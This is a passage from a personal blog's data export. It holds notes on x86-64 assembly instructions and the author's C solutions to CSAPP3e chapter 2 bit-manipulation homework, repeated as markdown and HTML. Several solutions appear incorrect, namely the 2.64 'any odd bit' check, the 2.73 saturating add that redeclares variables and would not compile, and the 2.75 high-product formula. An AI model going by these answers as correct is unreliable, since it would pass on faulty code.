second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift</li>\n<li>shift amount can be imm value or %cl</li>\n<li>a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63</li>\n<li>destination can be register or memory location</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"浮点指令\"><a href=\"#浮点指令\" class=\"headerlink\" title=\"浮点指令\"></a>浮点指令</h2><ul>\n<li>vmovss, vmovd的操作数可以是（第一个source，第二个destination）<ul>\n<li>memory， XMM</li>\n<li>XMM， memory</li>\n<li>按照书上的描述，好像还可以XMM， XMM</li>\n</ul>\n</li>\n<li>vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。</li>\n<li>vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）</li>\n<li>vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）</li>\n<li>vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）</li>\n<li>vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）</li>\n<li>vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM</li>\n<li>vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样</li>\n</ul>\n<h4 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h4><ul>\n<li>intel format have reverse order operands;</li>\n<li>Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value </li>\n<li>Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.</li>\n<li>Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0</li>\n<li>后缀的匹配</li>\n</ul>\n","slug":"汇编相关","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"汇编","slug":"汇编","permalink":"https://h-zex.github.io/tags/汇编/"}]},{"title":"CSAPP3e 第二章作业","date":"2017-08-06T04:18:27.000Z","path":"2017/08/06/CSAPP3e-第二章作业/","text":"2.5812345int isLittleEndian1()&#123; int a = 1; return ((char*)&amp;a)[0];&#125; 2.591234int f2_59(int x, int y)&#123; return x&amp;(((1&lt;&lt;(sizeof(int)-1)*8)-1)&lt;&lt;8)|(y&amp;0xFF);&#125; 2.6012345unsigned replaceByte(unsigned x, int i, unsigned char b)&#123; int t = ~0 - ((1LL&lt;&lt;(i+1&lt;&lt;3))-(1&lt;&lt;(i&lt;&lt;3))); return x&amp;t|((unsigned)b&lt;&lt;(i&lt;&lt;3));&#125; 2.611234int A2_61(int x)&#123; return !(x^~0);&#125; 1234int B2_61(int x)&#123; return !x;&#125; 1234int C2_61(int x)&#123; return !((x&amp;0xFF)^0xFF);&#125; 1234int D2_61(int x)&#123; return !((unsigned)x&gt;&gt;((sizeof(int)-1)&lt;&lt;3));&#125; 2.6212345int isRightShiftAreArithmetic()&#123; int x = -1&gt;&gt;1; return x==-1;&#125; 2.6312345unsigned srl(unsigned x, int k)&#123; unsigned xsra = (int)x&gt;&gt;k; return xsra&amp;(1&lt;&lt;(sizeof(int)&lt;&lt;3)-k)-1;&#125; 123456int sra(int x, int k)&#123; int xsrl = (unsigned)x&gt;&gt;k; int t = ~0-(1&lt;&lt;k)+1 &amp; x&gt;&gt;((sizeof(int)&lt;&lt;3)-1); return t|xsrl;&#125; 2.6412345//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始int anyOddOne(unsigned x)&#123; return (x&amp;0xaaaaaaaa)==0xaaaaaaaa;&#125; 2.6512345678910int oddOnesV1(unsigned x)&#123; //思路，用xor消掉成对的1，不成对的记录下来 x ^= x&lt;&lt;16; x ^= x&lt;&lt;8; x ^= x&lt;&lt;4; x ^= x&lt;&lt;2; x ^= x&lt;&lt;1; return x&gt;&gt;31;&#125; 12345678910int oddOnesV2(unsigned x)&#123; //思路与上一个函数类似 x ^= x&lt;&lt;1; //思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位） x ^= x&lt;&lt;2; //只考虑mod4==0的位置 x ^= x&lt;&lt;4; //只考虑mod8==0的位置 x ^= x&lt;&lt;8; //只考虑mod16==0的位置 x ^= x&lt;&lt;16; //只考虑mod32==0的位置 return x&gt;&gt;31;&#125; 2.66123456789int leftMostOne(unsigned x)&#123; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; return x-(x&gt;&gt;1);&#125; 2.671234int intSizeIs32()&#123; return INT_MAX==0x80000000-1;&#125; 2.68123456int lowerOneMark(int n)&#123; int t = -!(n-(sizeof(int)&lt;&lt;3)); //方法1 return (1&lt;&lt;n)-1&amp;~t | t;// return ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1; //方法2&#125; 2.6912345unsigned rotateLeft(unsigned x, int n)&#123; //移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞 return x&gt;&gt;((sizeof(unsigned)&lt;&lt;3)-n-1)&gt;&gt;1 | x&lt;&lt;n;&#125; 2.701234int fitBits(int x, int n)&#123; return x&gt;&gt;n-1==0 | x&gt;&gt;n-1==-1;&#125; 2.7112345typedef unsigned pack_t;int xbyte(pack_t word, int bytenum)&#123; return (int)word&lt;&lt;(3-bytenum&lt;&lt;3)&gt;&gt;24;&#125; 2.73123456789101112131415161718192021222324252627int saturatingAdd(int x, int y)&#123; //方法一 int t = (sizeof(int)&lt;&lt;3)-1; int p = ((unsigned)x&gt;&gt;t)+((unsigned)y&gt;&gt;t)+((unsigned)x+y&gt;&gt;t); t = ((unsigned)x&gt;&gt;t)+((unsigned)y&gt;&gt;t); return -(p==2&amp;&amp;t!=1)&amp;INT_MIN | -(p==1&amp;&amp;t!=1)&amp;INT_MAX | -(p==0||t==1)&amp;x+y | -(p==3||t==1)&amp;x+y; //方法二 int t = (sizeof(int)&lt;&lt;3)-1; int p = ((unsigned)x&gt;&gt;t&lt;&lt;2)|((unsigned)y&gt;&gt;t&lt;&lt;1)|((unsigned)x+y&gt;&gt;t); return -(p==6)&amp;INT_MIN | -(p==1)&amp;INT_MAX | -(p!=1&amp;&amp;p!=6)&amp;x+y; //方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904） int w=sizeof(int)&lt;&lt;3; int sum = x+y; int mask = 1&lt;&lt;(w-1); int x_lmb = x&amp;mask; int y_lmb = y&amp;mask; int sum_lmb = sum&amp;mask; int neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb); int pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb; (pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); //这一条不错 return sum;&#125; 2.741234567int tsubOk(int x, int y)&#123; int t = (sizeof(int)&lt;&lt;3)-1; int p = (unsigned)x&gt;&gt;t&lt;&lt;2 | (unsigned)-y&gt;&gt;t&lt;&lt;1 | (unsigned)x-y&gt;&gt;t; t = y==INT_MIN; return p!=6 &amp;&amp; p!=1 &amp;&amp; !t || t &amp;&amp; p==6;&#125; 2.75123456unsigned unsignedHightProd(unsigned x, unsigned y)&#123; unsigned t = signed_high_prod(x, y); int l = (sizeof(int)&lt;&lt;3)-1; return t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;&#125; 2.761234567891011void* Calloc(size_t nmemb, size_t size)&#123; size_t t = nmemb*size; void *p; if(!size || t/size==nmemb)&#123; p = malloc(t); if(!p)return NULL; memset(p, 0, t); &#125;else return NULL; return p;&#125; 2.7712345678int f2_77(int x)&#123; int k1 = (x&lt;&lt;4)+x; int k2 = -(x&lt;&lt;3)+x; int k3 = (x&lt;&lt;6)-(x&lt;&lt;2); int k4 = -(x&lt;&lt;7)+(x&lt;&lt;4); return (k1==x*17)&lt;&lt;3 | (k2==x*-7)&lt;&lt;2 | (k3==x*60)&lt;&lt;1 | k4==x*-112;&#125; 2.78123456int dividePower2(int x, int k)&#123; int l = sizeof(int)&lt;&lt;3; l = -(x&gt;&gt;l-1); return (l&lt;&lt;k)-l+x &gt;&gt; k;&#125; 2.791234567int mul3div4(int x)&#123; x = (x&lt;&lt;2) - x; int l = sizeof(int)&lt;&lt;3; int t = -(x&gt;&gt;l-1); return (t&lt;&lt;2)-t+x &gt;&gt; 2;&#125; 2.8012345678910int threefourths(int x)&#123; int t = x&amp;0x3; int t2 = -(x&gt;&gt;(sizeof(int)&lt;&lt;3)-1); int p = (x&gt;&gt;2); p = (p&lt;&lt;1)+p; t = (t&lt;&lt;1)+t; p += (t&gt;&gt;2) + (t2&amp;&amp;t); return p;&#125; 2.8112345678910int hw281A(int k)&#123; return 0-(1&lt;&lt;k-!!k&lt;&lt;!!k); //k may equal to 0 or 32;&#125;int hw281B(int j, int k)&#123; int t = k+j; return (0-(1&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (0-(1&lt;&lt;t-!!t&lt;&lt;!!t));&#125; 2.8212345678/* * A: NO; x== 0x10000000, B==rand(); * B: Yes; * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。 * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加 * D: Yes; * E: Yes; */ 2.83$\\sum_{i=1}^{\\infty}Y2^{-ki}$ 2.841return ((sx&lt;sy) &amp;&amp; ux!=0 &amp;&amp; uy!=0x80000000) | (sx==sy) &amp; !!(ux-uy);","raw":"---\ntitle: CSAPP3e 第二章作业\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-08-06 12:18:27\ntags:\n- CSAPP Homework\ndescription: My solution to Ch2's Hw\ncategories:\n- CSAPP\n---\n\n## 2.58\n```c\nint isLittleEndian1()\n{\n\tint a = 1;\n\treturn ((char*)&a)[0];\n}\n```\n\n\n## 2.59\n```c\nint f2_59(int x, int y)\n{\n\treturn x&(((1<<(sizeof(int)-1)*8)-1)<<8)|(y&0xFF);\n}\n```\n\n\n## 2.60\n```c\nunsigned replaceByte(unsigned x, int i, unsigned char b)\n{\n\tint t = ~0 - ((1LL<<(i+1<<3))-(1<<(i<<3)));\n\treturn x&t|((unsigned)b<<(i<<3));\n}\n```\n\n\n## 2.61\n```c\nint A2_61(int x)\n{\n\treturn !(x^~0);\n}\n```\n\n```c\nint B2_61(int x)\n{\n\treturn !x;\n}\n```\n\n```c\nint C2_61(int x)\n{\n\treturn !((x&0xFF)^0xFF);\n}\n```\n\n```c\nint D2_61(int x)\n{\n\treturn !((unsigned)x>>((sizeof(int)-1)<<3));\n}\n```\n\n\n## 2.62\n```c\nint isRightShiftAreArithmetic()\n{\n\tint x = -1>>1;\n\treturn x==-1;\n}\n```\n\n\n## 2.63\n```c\nunsigned srl(unsigned x, int k)\n{\n\tunsigned xsra = (int)x>>k;\n\treturn xsra&(1<<(sizeof(int)<<3)-k)-1;\n}\n```\n\n```c\nint sra(int x, int k)\n{\n\tint xsrl = (unsigned)x>>k;\n\tint t = ~0-(1<<k)+1 & x>>((sizeof(int)<<3)-1);\n\treturn t|xsrl;\n}\n```\n\n\n## 2.64\n```c\n//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始\nint anyOddOne(unsigned x)\n{\n\treturn (x&0xaaaaaaaa)==0xaaaaaaaa;\n}\n```\n\n\n## 2.65\n```c\nint oddOnesV1(unsigned x)\n{\n\t//思路，用xor消掉成对的1，不成对的记录下来\n\tx ^= x<<16;\n\tx ^= x<<8;\n\tx ^= x<<4;\n\tx ^= x<<2;\n\tx ^= x<<1;\n\treturn x>>31;\n}\n```\n\n```c\nint oddOnesV2(unsigned x)\n{\n\t//思路与上一个函数类似\n\tx ^= x<<1;\t//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）\n\tx ^= x<<2;\t//只考虑mod4==0的位置\n\tx ^= x<<4;\t//只考虑mod8==0的位置\n\tx ^= x<<8;\t//只考虑mod16==0的位置\n\tx ^= x<<16;\t//只考虑mod32==0的位置\n\treturn x>>31;\n}\n```\n\n\n## 2.66\n```c\nint leftMostOne(unsigned x)\n{\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\treturn x-(x>>1);\n}\n```\n\n\n## 2.67\n```c\nint intSizeIs32()\n{\n\treturn INT_MAX==0x80000000-1;\n}\n```\n\n\n## 2.68\n```c\nint lowerOneMark(int n)\n{\n\tint t = -!(n-(sizeof(int)<<3));\t//方法1\n\treturn (1<<n)-1&~t | t;\n//\treturn ((n!=(sizeof(int)<<3))<<n)-1;\t//方法2\n}\n```\n\n\n## 2.69\n```c\nunsigned rotateLeft(unsigned x, int n)\n{\n\t//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞\n\treturn x>>((sizeof(unsigned)<<3)-n-1)>>1 | x<<n;\n}\n```\n\n\n## 2.70\n```c\nint fitBits(int x, int n)\n{\n\treturn x>>n-1==0 | x>>n-1==-1;\n}\n```\n\n\n## 2.71\n```c\ntypedef unsigned pack_t;\nint xbyte(pack_t word, int bytenum)\n{\n\treturn (int)word<<(3-bytenum<<3)>>24;\n}\n```\n\n## 2.73\n```c\nint saturatingAdd(int x, int y)\n{\n\t//方法一\n\tint t = (sizeof(int)<<3)-1;\n\tint p = ((unsigned)x>>t)+((unsigned)y>>t)+((unsigned)x+y>>t);\n\tt = ((unsigned)x>>t)+((unsigned)y>>t);\n\treturn -(p==2&&t!=1)&INT_MIN | -(p==1&&t!=1)&INT_MAX | -(p==0||t==1)&x+y | -(p==3||t==1)&x+y;\n  \n\t//方法二\n\tint t = (sizeof(int)<<3)-1;\n\tint p = ((unsigned)x>>t<<2)|((unsigned)y>>t<<1)|((unsigned)x+y>>t);\n\treturn -(p==6)&INT_MIN | -(p==1)&INT_MAX | -(p!=1&&p!=6)&x+y;\n  \n\t//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）\n\tint w=sizeof(int)<<3;\n\tint sum = x+y;\n\tint mask = 1<<(w-1);\n\tint x_lmb = x&mask;\n\tint y_lmb = y&mask;\n\tint sum_lmb = sum&mask;\n\t\n\tint neg_of = x_lmb && y_lmb && (!sum_lmb);\n\tint pos_of = !x_lmb && !y_lmb && sum_lmb;\n\t\n\t(pos_of &&(sum=INT_MAX)) || (neg_of && (sum = INT_MIN)); //这一条不错\n\treturn sum;\n}\n```\n\n\n## 2.74\n```c\nint tsubOk(int x, int y)\n{\n\tint t = (sizeof(int)<<3)-1;\n\tint p = (unsigned)x>>t<<2 | (unsigned)-y>>t<<1 | (unsigned)x-y>>t;\n\tt = y==INT_MIN;\n\treturn p!=6 && p!=1 && !t || t && p==6;\n}\n```\n\n\n## 2.75\n```c\nunsigned unsignedHightProd(unsigned x, unsigned y)\n{\n\tunsigned t = signed_high_prod(x, y);\n\tint l = (sizeof(int)<<3)-1;\n\treturn t + (x>>l)*x+(y>>l)*y;\n}\n```\n\n\n## 2.76\n```c\nvoid* Calloc(size_t nmemb, size_t size)\n{\n\tsize_t t = nmemb*size;\n\tvoid *p;\n\tif(!size || t/size==nmemb){\n\t\tp = malloc(t);\n\t\tif(!p)return NULL;\n\t\tmemset(p, 0, t);\n\t}else return NULL;\n\treturn p;\n}\n```\n\n\n## 2.77\n```c\nint f2_77(int x)\n{\n\tint k1 = (x<<4)+x;\n\tint k2 = -(x<<3)+x;\n\tint k3 = (x<<6)-(x<<2);\n\tint k4 = -(x<<7)+(x<<4);\n\treturn (k1==x*17)<<3 | (k2==x*-7)<<2 | (k3==x*60)<<1 | k4==x*-112;\n}\n```\n\n## 2.78\n```c\nint dividePower2(int x, int k)\n{\n\tint l = sizeof(int)<<3;\n\tl = -(x>>l-1);\n\treturn (l<<k)-l+x >> k;\n}\n```\n## 2.79\n```c\nint mul3div4(int x)\n{\n\tx = (x<<2) - x;\n\tint l = sizeof(int)<<3;\n\tint t = -(x>>l-1);\n\treturn (t<<2)-t+x >> 2;\n}\n```\n## 2.80\n```c\nint threefourths(int x)\n{\n\tint t = x&0x3;\n\tint t2 = -(x>>(sizeof(int)<<3)-1);\n\tint p = (x>>2);\n\tp = (p<<1)+p;\n\tt = (t<<1)+t;\n\tp += (t>>2) + (t2&&t);\n\treturn p;\n}\n```\n## 2.81\n```c\nint hw281A(int k)\n{\n\treturn 0-(1<<k-!!k<<!!k);\t//k may equal to 0 or 32;\n}\n\nint hw281B(int j, int k)\n{\n\tint t = k+j;\n\treturn (0-(1<<j-!!j<<!!j)) ^ (0-(1<<t-!!t<<!!t));\n}\n```\n## 2.82\n```c\n/*\n * A: NO; x== 0x10000000, B==rand();\n * B: Yes; \n * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。\n * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加\n * D: Yes;\n * E: Yes;\n */\n```\n\n## 2.83\n$\\sum_{i=1}^{\\infty}Y*2^{-k*i}$\n\n## 2.84\n```c\nreturn ((sx<sy) && ux!=0 && uy!=0x80000000) | (sx==sy) & !!(ux-uy);\n```\n","content":"<h2 id=\"2-58\"><a href=\"#2-58\" class=\"headerlink\" title=\"2.58\"></a>2.58</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isLittleEndian1</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ((<span class=\"keyword\">char</span>*)&amp;a)[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-59\"><a href=\"#2-59\" class=\"headerlink\" title=\"2.59\"></a>2.59</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f2_59</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;(((<span class=\"number\">1</span>&lt;&lt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)<span class=\"number\">-1</span>)*<span class=\"number\">8</span>)<span class=\"number\">-1</span>)&lt;&lt;<span class=\"number\">8</span>)|(y&amp;<span class=\"number\">0xFF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-60\"><a href=\"#2-60\" class=\"headerlink\" title=\"2.60\"></a>2.60</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">replaceByte</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> i, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = ~<span class=\"number\">0</span> - ((<span class=\"number\">1L</span>L&lt;&lt;(i+<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">3</span>))-(<span class=\"number\">1</span>&lt;&lt;(i&lt;&lt;<span class=\"number\">3</span>)));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;t|((<span class=\"keyword\">unsigned</span>)b&lt;&lt;(i&lt;&lt;<span class=\"number\">3</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-61\"><a href=\"#2-61\" class=\"headerlink\" title=\"2.61\"></a>2.61</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">A2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !(x^~<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">B2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">C2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !((x&amp;<span class=\"number\">0xFF</span>)^<span class=\"number\">0xFF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">D2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !((<span class=\"keyword\">unsigned</span>)x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)<span class=\"number\">-1</span>)&lt;&lt;<span class=\"number\">3</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-62\"><a href=\"#2-62\" class=\"headerlink\" title=\"2.62\"></a>2.62</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isRightShiftAreArithmetic</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x = <span class=\"number\">-1</span>&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x==<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-63\"><a href=\"#2-63\" class=\"headerlink\" title=\"2.63\"></a>2.63</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">srl</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> xsra = (<span class=\"keyword\">int</span>)x&gt;&gt;k;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> xsra&amp;(<span class=\"number\">1</span>&lt;&lt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)-k)<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sra</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> xsrl = (<span class=\"keyword\">unsigned</span>)x&gt;&gt;k;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = ~<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;k)+<span class=\"number\">1</span> &amp; x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> t|xsrl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-64\"><a href=\"#2-64\" class=\"headerlink\" title=\"2.64\"></a>2.64</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">anyOddOne</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&amp;<span class=\"number\">0xaaaaaaaa</span>)==<span class=\"number\">0xaaaaaaaa</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-65\"><a href=\"#2-65\" class=\"headerlink\" title=\"2.65\"></a>2.65</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">oddOnesV1</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//思路，用xor消掉成对的1，不成对的记录下来</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">oddOnesV2</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//思路与上一个函数类似</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">1</span>;\t<span class=\"comment\">//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">2</span>;\t<span class=\"comment\">//只考虑mod4==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">4</span>;\t<span class=\"comment\">//只考虑mod8==0的位置</span></span><br><span class=\"line\">\tx ^= x&lt;&lt;<span class=\"number\">8</span>;\t<span 